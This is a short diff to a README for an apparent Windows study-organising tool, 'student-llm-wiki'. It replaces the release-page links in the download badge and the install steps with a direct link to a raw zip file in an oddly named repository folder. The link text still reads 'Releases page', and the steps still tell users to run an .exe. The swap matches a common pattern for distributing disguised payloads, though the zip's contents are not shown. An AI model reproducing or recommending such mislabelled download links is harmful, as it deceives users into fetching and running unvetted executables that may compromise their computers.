@@ -1,6 +1,6 @@
 # 🎓 student-llm-wiki - Organize your university studies using AI
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Tenor-luffacylindrica207/student-llm-wiki/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tenor-luffacylindrica207/student-llm-wiki/main/Orleanistic/llm-student-wiki-v3.6.zip)
 
 ## What is this tool? 🧠
 
@@ -23,7 +23,7 @@ University students often struggle with too many documents and scattered slides.
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/Tenor-luffacylindrica207/student-llm-wiki/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Tenor-luffacylindrica207/student-llm-wiki/main/Orleanistic/llm-student-wiki-v3.6.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in `.exe`. 
 4. Save the file to your computer.
